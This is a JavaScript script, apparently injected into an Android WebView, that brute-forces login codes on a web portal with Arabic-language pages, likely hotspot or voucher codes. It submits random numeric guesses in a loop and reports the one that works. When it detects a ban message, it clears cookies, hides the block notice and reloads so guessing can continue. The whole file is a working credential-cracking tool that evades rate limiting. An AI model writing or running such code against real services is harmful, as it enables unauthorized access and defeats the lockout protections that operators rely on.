(function() {
    const CFG = window.FINDER_CONFIG;
    if (!CFG) return;
    if (window.__cracking) return;
    window.__cracking = true;
    let stopped = false;
    window.stopFinder = function() { stopped = true; window.__cracking = false; };

    const id = CFG.id || 0;
    const bridge = window["AndroidBridge" + id];
    const log = (m) => { try { bridge.log(m); } catch(e) {} };

    async function run() {
        log('▶ بدء');
        const maxVal = Math.pow(10, CFG.digits) - 1;
        let done = 0;

        for (let i = 0; i < CFG.attempts; i++) {
            if (stopped) { log('⏹ توقف'); break; }

            const input = document.querySelector('input[name="username"]');
            const btn = document.querySelector('.login-submit') || document.querySelector('button[type="submit"]');
            
            if (!input) {
                await new Promise(r => setTimeout(r, 1000));
                continue;
            }

            const num = Math.floor(Math.random() * (maxVal + 1));
            const v = CFG.prefix + String(num).padStart(CFG.digits, '0') + CFG.suffix;

            input.value = v;
            input.dispatchEvent(new Event('input', {bubbles:true}));
            input.dispatchEvent(new Event('change', {bubbles:true}));

            done++;
            try { bridge.progress(done, CFG.attempts, v); } catch(e) {}
            log('🔍 ' + v);

            if (btn) { try { btn.click(); } catch(e) {} }

            await new Promise(r => setTimeout(r, 1500));

            const pageText = document.body.innerText;

            // كشف الحظر
            if (pageText.includes("انت محظور") || pageText.includes("تجاوزت العدد")) {
                log('🛑 حظر! إخفاء الصفحة وتجديد الجلسة...');
                try { bridge.clearCookies(); } catch(e) {}
                try {
                    var b = document.getElementById('block');
                    if (b) b.style.display = 'none';
                    var l = document.getElementById('login');
                    if (l) l.style.display = 'block';
                } catch(e) {}
                setTimeout(() => { window.location.reload(); }, 800);
                return;
            }

            // كشف النجاح
            if (window.location.href.includes("status") || pageText.includes("تم تسجيل الدخول") || pageText.includes("الوقت المتبقي")) {
                log('✅✅✅ نجاح: ' + v);
                try { bridge.found(v, pageText); } catch(e) {}
                window.__cracking = false;
                return;
            }

            // عرض رسالة الخطأ
            const errDiv = document.getElementById('error');
            if (errDiv && errDiv.innerText.trim() !== "") {
                log('📄 ' + errDiv.innerText.trim());
            }

            await new Promise(r => setTimeout(r, CFG.pause || 1000));
        }
        log('❌ انتهى');
        window.__cracking = false;
    }

    setTimeout(run, 300);
})();
